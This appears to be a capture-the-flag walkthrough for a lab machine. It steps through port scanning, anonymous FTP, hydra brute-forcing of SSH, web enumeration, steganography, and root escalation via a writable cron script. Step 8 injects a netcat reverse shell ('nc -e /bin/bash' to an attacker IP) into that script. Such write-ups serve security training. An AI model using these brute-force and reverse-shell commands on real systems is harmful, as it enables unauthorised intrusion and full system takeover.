# Attacker's Walkthrough: Exploiting the Vulnerable Machine

## Step 1: Initial Reconnaissance
### Scan for Open Ports
First, scan the target machine to identify open services:
```bash
nmap -sC -sV -p- <target-ip>
```
From the scan results, note that the following ports are open:
- **21 (FTP)**
- **22 (SSH)**
- **80 (HTTP)**

## Step 2: Enumerating FTP
Since FTP allows **anonymous login**, connect and list available files:
```bash
ftp <target-ip>
```
Enter `anonymous` as the username and any password. List the directory:
```bash
ls
```
Find `hint.txt`, download it:
```bash
get hint.txt
```
Inspect `hint.txt`, which contains a username hint for SSH.

## Step 3: Brute Forcing SSH Credentials
Use **hydra** to brute-force SSH using the discovered username:
```bash
hydra -l majorsreekumar69 -P rockyou.txt ssh://<target-ip>
```
Once credentials are found, log in:
```bash
ssh majorsreekumar69@<target-ip>
```

## Step 4: Finding User Flag
After logging in, check the home directory:
```bash
ls -la
cat user.txt
```
Grab the first flag.

## Step 5: Web Server Enumeration
Run **Gobuster** to find hidden directories:
```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt
```
Identify:
- `/encode.jpg` (steganography file)
- `/hint.wav` (audio clue)

Download the files:
```bash
wget http://<target-ip>/encode.jpg
wget http://<target-ip>/hint.wav
```

## Step 6: Decoding Morse Code (Audio File)
Convert audio to text:
```bash
audacity hint.wav  # Inspect manually for Morse Code
morse-decoder hint.wav  # Or use an online decoder
```
Extract the password for `encode.jpg`.

## Step 7: Extracting Steganography Data
Use **steghide** to extract hidden data:
```bash
steghide extract -sf encode.jpg
```
Enter the password found from `hint.wav`. The extracted text provides a path to `/opt/secret_script.sh`.

## Step 8: Exploiting Cron Job for Privilege Escalation
Check cron jobs:
```bash
crontab -l
```
See that `/opt/secret_script.sh` runs every minute. Modify it:
```bash
echo 'nc -e /bin/bash <attacker-ip> <attacker-port>' > /opt/secret_script.sh
chmod +x /opt/secret_script.sh
```
Start a netcat listener:
```bash
nc -lvnp <attacker-port>
```
Wait for the cron job to execute and get a **root shell**.

## Step 9: Capture the Root Flag
```bash
cat /root/root.txt
```
Congratulations! You have exploited the machine successfully.

